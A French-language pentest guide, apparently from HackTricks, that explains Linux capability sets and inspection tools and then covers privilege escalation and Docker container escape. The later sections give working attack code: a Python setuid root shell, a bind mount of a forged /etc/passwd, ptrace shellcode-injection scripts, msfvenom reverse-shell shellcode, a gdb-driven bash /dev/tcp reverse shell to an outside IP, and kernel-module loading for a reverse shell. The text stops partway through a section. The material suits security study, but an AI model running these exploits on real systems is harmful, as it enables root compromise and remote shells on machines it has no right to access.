# Capacités Linux

{{#include ../../banners/hacktricks-training.md}}

Les capabilities Linux divisent les **privilèges root en unités plus petites et distinctes**, permettant aux processus de disposer d’un sous-ensemble de privilèges. Cela réduit les risques en n’accordant pas inutilement l’intégralité des privilèges root.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Le problème :

- Les utilisateurs normaux disposent de permissions limitées pour des opérations telles que l’ouverture de raw sockets ou le bind de ports Internet inférieurs à 1024 ; les capabilities peuvent accorder uniquement l’opération requise au lieu de l’intégralité des privilèges root.<sup>[[14]](#references)</sup>

### Ensembles de capabilities :

Linux expose ces ensembles de capabilities par thread, et le kernel applique leurs contraintes lorsqu’un processus change d’identifiants ou exécute un fichier.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)** :

- **Objectif** : Identifie les capabilities pouvant contribuer à l’ensemble permitted après `execve()` lorsque le fichier exécuté possède des file capabilities inheritable correspondantes.
- **Fonctionnement** : L’ensemble inheritable du thread est conservé à travers `execve()` ; cela ne rend pas ces capabilities effectives à lui seul.
- **Restrictions** : L’ajout d’une capability à cet ensemble est limité par les ensembles permitted et bounding.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)** :

- **Objectif** : Représente les capabilities effectivement utilisées par un processus à un moment donné.
- **Fonctionnement** : Il s’agit de l’ensemble de capabilities vérifié par le kernel pour accorder les permissions nécessaires à différentes opérations. Pour les fichiers, cet ensemble peut être un indicateur signalant si les capabilities permitted du fichier doivent être considérées comme effectives.
- **Importance** : L’ensemble effective est essentiel pour les vérifications immédiates des privilèges ; il constitue l’ensemble actif de capabilities qu’un processus peut utiliser.

3. **Permitted (CapPrm)** :

- **Objectif** : Définit l’ensemble maximal de capabilities qu’un processus peut posséder.
- **Fonctionnement** : Un processus peut élever une capability de l’ensemble permitted vers son ensemble effective, ce qui lui permet d’utiliser cette capability. Il peut également supprimer des capabilities de son ensemble permitted.
- **Limite** : Si une capability est supprimée de cet ensemble, elle ne peut normalement pas être restaurée sans exécuter un fichier qui l’accorde ou effectuer une autre transition privilégiée.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)** :

- **Objectif** : Limite les capabilities qu’un processus peut obtenir d’un fichier lors de `execve()` ainsi que celles qu’il peut ajouter à son ensemble inheritable.
- **Fonctionnement** : Cet ensemble est hérité à travers `fork()` et conservé à travers `execve()` ; des capabilities peuvent en être supprimées lorsque l’appelant possède `CAP_SETPCAP`.
- **Cas d’utilisation** : La suppression des capabilities inutiles de cet ensemble limite l’acquisition ultérieure de privilèges.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)** :
- **Objectif** : Permet à certaines capabilities sélectionnées de rester permitted et effective lors de l’exécution, avec `execve()`, d’un programme non privilégié.
- **Fonctionnement** : Les capabilities ambient sont ajoutées aux nouveaux ensembles permitted et effective lorsque le fichier exécuté n’est pas privilégié.
- **Restrictions** : Une capability ne peut être ambient que tant qu’elle est présente à la fois dans les ensembles permitted et inheritable ; l’exécution d’un fichier set-user-ID/set-group-ID ou d’un fichier possédant des capabilities efface l’ensemble ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capacités des processus et des binaires

### Capacités des processus

Pour voir les capabilities d’un processus particulier, utilisez le fichier **status** dans le répertoire /proc. Comme il fournit davantage de détails, limitons-nous aux informations relatives aux capabilities Linux.\
Notez que, pour tous les processus en cours d’exécution, les informations sur les capabilities sont conservées par thread, tandis que les file capabilities sont stockées dans les attributs étendus `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Vous trouverez les capabilities définies dans /usr/include/linux/capability.h

Vous pouvez trouver les capabilities du processus actuel avec `cat /proc/self/status` ou `capsh --print`, et celles des autres processus dans `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Cette commande devrait renvoyer cinq lignes de capabilities sur la plupart des systèmes.<sup>[[15]](#references)</sup>

- CapInh = Capabilities héritées
- CapPrm = Capabilities autorisées
- CapEff = Capabilities effectives
- CapBnd = Ensemble de restrictions
- CapAmb = Ensemble de capabilities ambiantes
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ces nombres hexadécimaux n’ont pas de sens. À l’aide de l’utilitaire `capsh`, nous pouvons les décoder en noms de capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Vérifions maintenant les **capabilities** utilisées par `ping` :
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Bien que cela fonctionne, il existe une autre méthode plus simple. Pour voir les capabilities d’un processus en cours d’exécution, utilisez l’outil **getpcaps** suivi de son identifiant de processus (PID) ; il accepte également une liste d’identifiants de processus.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Vérifions les capabilities de `tcpdump` après avoir attribué `cap_net_admin` et `cap_net_raw` au binaire pour renifler le réseau (`tcpdump` s’exécute dans le processus 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Comme vous pouvez le constater, les capabilities correspondent aux résultats des deux méthodes d’inspection d’un processus. L’outil `getpcaps` utilise libcap pour interroger les capabilities d’un processus cible et les afficher sous forme de texte ; il accepte un ou plusieurs PIDs.<sup>[[22]](#references)</sup>

### Capabilities des binaires

Les binaires peuvent posséder des file capabilities qui sont appliquées lors de leur exécution. Par exemple, un binaire `ping` peut avoir la capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Vous pouvez **rechercher des binaires avec des capabilities** à l’aide de `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Suppression des capabilities avec capsh

Si nous supprimons `CAP_NET_RAW` de l'ensemble de bounding prédominant, un programme qui a besoin de cette capability ne devrait plus pouvoir l'utiliser.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Outre la sortie de _capsh_ elle-même, la commande _tcpdump_ elle-même devrait également générer une erreur.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

L'erreur indique que `tcpdump` ne peut pas s'exécuter avec la capability de fichier demandée après la suppression de `CAP_NET_RAW` de l'ensemble des capabilities autorisées.

### Supprimer les capabilities

Vous pouvez supprimer les capabilities d'un fichier avec `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux n’attribue pas directement de capabilities de fichier à un utilisateur de connexion, mais le module PAM `pam_cap` peut définir des capabilities inheritable pour les sessions authentifiées à l’aide de `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Chaque entrée associe des noms ou numéros de capabilities séparés par des virgules à un ou plusieurs noms d’utilisateur.<sup>[[17]](#references)</sup>  
Exemple de fichier :
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacités de l'environnement

Compiler le programme suivant permet de **lancer un shell bash dans un environnement fournissant des capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
À l’intérieur du **bash exécuté par le binaire ambient compilé**, il est possible d’observer les **nouvelles capabilities** (un utilisateur standard n’aura aucune capability dans la section « current »).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Vous pouvez **uniquement ajouter les capabilities présentes** à la fois dans les ensembles autorisés et héritables.<sup>[[14]](#references)</sup>

### Binaires capability-aware/capability-dumb

Un capability-dumb binary est un programme doté de file capabilities qui n'utilise pas libcap pour les gérer. Si son bit effective est défini, le kernel active les capabilities autorisées du fichier dans l'ensemble effectif du processus ; l'exécution peut échouer si le processus n'a pas obtenu toutes les capabilities autorisées.<sup>[[14]](#references)</sup>

## Capacités des services

Un service système qui s'exécute en tant que root peut conserver de larges capabilities, sauf si son environnement d'exécution les restreint. Dans une unité systemd, `User=` sélectionne l'utilisateur du service et `AmbientCapabilities=` ajoute les capabilities nommées à l'ensemble ambient du processus exécuté.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities dans les conteneurs Docker

Docker démarre les conteneurs avec un ensemble de capabilities par défaut qui peut être modifié avec `--cap-add` et `--cap-drop` ; un conteneur exemple peut être inspecté avec `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Les capabilities sont utiles lorsque vous **souhaitez restreindre vos propres processus après avoir effectué des opérations privilégiées** (par exemple, après avoir configuré un chroot et vous être connecté à un socket). Cependant, elles peuvent être exploitées en leur transmettant des commandes ou des arguments malveillants, qui sont ensuite exécutés en tant que root.<sup>[[2]](#references)</sup>

Vous pouvez imposer des capabilities de fichier aux programmes avec `setcap` et les rechercher avec `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Dans le texte des capacités de fichier, `+ep` élève la capacité nommée dans les ensembles effectif et autorisé ; `-` abaisse les indicateurs sélectionnés.<sup>[[21]](#references)</sup>

Pour identifier les programmes d’un système ou d’un dossier qui disposent de capacités, utilisez `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exemple d’exploitation

Dans l’exemple suivant, le binaire `/usr/bin/python2.6` est vulnérable à une privesc :
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** nécessaires à `tcpdump` pour **permettre à n’importe quel utilisateur de sniffer des paquets** :
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Le cas particulier des capabilities « vides »

Un fichier peut contenir un ensemble de capabilities vide (`getcap myelf` renvoie `myelf =ep`). Un ensemble vide n'accorde aucune capability ; lorsqu'il est combiné à un bit set-user-ID appartenant à root, le programme peut tout de même modifier les IDs effectif et sauvegardé du processus en cours pour les définir à 0, sans obtenir de file capabilities. Un fichier non attribué, sans bit SUID/SGID et avec `=ep` ne s'exécute pas en tant que root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** est une capability Linux très puissante, souvent assimilée à un niveau proche de root en raison de ses nombreux **privilèges administratifs**, comme le montage de périphériques ou la manipulation de fonctionnalités du kernel. Bien qu'indispensable aux containers simulant des systèmes complets, **`CAP_SYS_ADMIN` pose d'importants problèmes de sécurité**, notamment dans les environnements containerisés, en raison de son potentiel d'escalade de privilèges et de compromission du système. Son utilisation nécessite donc des évaluations de sécurité strictes et une gestion prudente, avec une forte préférence pour la suppression de cette capability dans les containers spécifiques aux applications, afin de respecter le **principe du moindre privilège** et de réduire la surface d'attaque.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
À l’aide de Python, vous pouvez monter un fichier _passwd_ modifié par-dessus le véritable fichier _passwd_ :
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Et enfin, **montez** le fichier `passwd` modifié sur `/etc/passwd` :
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Et vous pourrez effectuer un **`su` en tant que root** en utilisant le mot de passe "password".

**Exemple avec l’environnement (Docker breakout)**

Vous pouvez vérifier les capabilities activées à l’intérieur du conteneur Docker à l’aide de :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dans la sortie précédente, vous pouvez voir que la capability SYS_ADMIN est activée.<sup>[[14]](#references)</sup>

- **Mount**

Avec un accès approprié aux devices et aux namespaces, cela peut permettre à un conteneur Docker de **monter un disque de l’hôte et d’accéder à son contenu**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Accès complet**

Dans la méthode précédente, nous avons réussi à accéder au disque de l’hôte.\
Si l’hôte exécute un serveur **ssh**, vous pourriez **créer un utilisateur à l’intérieur du disque monté** et y accéder via SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Avec `CAP_SYS_PTRACE`, un processus peut tracer et inspecter les autres processus visibles dans son espace de noms PID. Pour cibler les processus de l’hôte depuis un conteneur Docker, partagez l’espace de noms PID de l’hôte avec `--pid=host` (ou rejoignez un espace de noms contenant la cible).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** accorde la possibilité d’utiliser les fonctionnalités de débogage et de traçage des appels système fournies par `ptrace(2)` ainsi que les appels d’attachement inter-mémoire tels que `process_vm_readv(2)` et `process_vm_writev(2)`. Bien que puissant à des fins de diagnostic et de monitoring, si `CAP_SYS_PTRACE` est activé sans mesures restrictives telles qu’un filtre seccomp sur `ptrace(2)`, il peut considérablement compromettre la sécurité du système. Plus précisément, il peut être exploité pour contourner d’autres restrictions de sécurité, notamment celles imposées par seccomp, comme le démontrent des [proofs of concept (PoC) comme celui-ci](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Exemple avec binaire (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Exemple avec un binaire (gdb)**

`gdb` avec la capability `ptrace` :
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Créer un shellcode avec msfvenom pour l’injecter en mémoire via gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Déboguer un processus root avec gdb et copier-coller les lignes gdb générées précédemment :
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Exemple avec environnement (Docker breakout) - Un autre abus de gdb**

Si **GDB** est installé (ou si vous pouvez l’installer avec `apk add gdb` ou `apt install gdb`, par exemple), vous pouvez **déboguer un processus depuis l’hôte** et lui faire appeler la fonction `system`. (Cette technique nécessite également la capacité `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Vous ne pourrez pas voir la sortie de la commande exécutée, mais elle sera exécutée par ce processus (obtenez donc un rev shell).

> [!WARNING]
> Si vous obtenez l’erreur "No symbol "system" in current context.", consultez l’exemple précédent qui charge un shellcode dans un programme via gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Vous pouvez vérifier les capabilities activées à l’intérieur du conteneur Docker à l’aide de :
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lister les **processus** exécutés sur l'**hôte** `ps -eaf`

1. Obtenir l'**architecture** `uname -m`
2. Trouver un **shellcode** pour l'architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trouver un **programme** pour **injecter** le **shellcode** dans la mémoire d'un processus ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifier** le **shellcode** dans le programme et le **compiler** `gcc inject.c -o inject`
5. L'**injecter** et récupérer votre **shell** : `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permet à un processus de **charger et décharger des modules kernel (`init_module(2)`, `finit_module(2)` et les appels système `delete_module(2)`)**, offrant un accès direct aux opérations fondamentales du kernel. Cette capability présente des risques critiques pour la sécurité, car le chargement d'un module peut modifier le comportement du kernel et contourner les limites d'isolation.<sup>[[6]](#references)[[14]](#references)</sup>
**Cela permet d'insérer ou de supprimer des modules dans le kernel visible par le processus ; dans un conteneur, déterminer s'il s'agit du kernel de l'hôte dépend de la configuration de l'isolation**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Dans l'exemple suivant, le binaire **`python`** possède cette capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Par défaut, la commande **`modprobe`** recherche les fichiers de liste et de mappage des dépendances dans le répertoire **`/lib/modules/$(uname -r)`**.\
Pour exploiter cela, créons un faux dossier **lib/modules** :
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Ensuite, **compilez le module du kernel dont vous trouverez 2 exemples ci-dessous et copiez-le** dans ce dossier :
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Enfin, exécutez le code Python nécessaire pour charger ce module du noyau :
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Exemple 2 avec un binaire**

Dans l’exemple suivant, le binaire **`kmod`** possède cette capacité.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Ce qui signifie qu’il est possible d’utiliser la commande **`insmod`** pour insérer un module du kernel. Suivez l’exemple ci-dessous pour obtenir un **reverse shell** en abusant de ce privilège.

**Exemple avec un environnement (Docker breakout)**

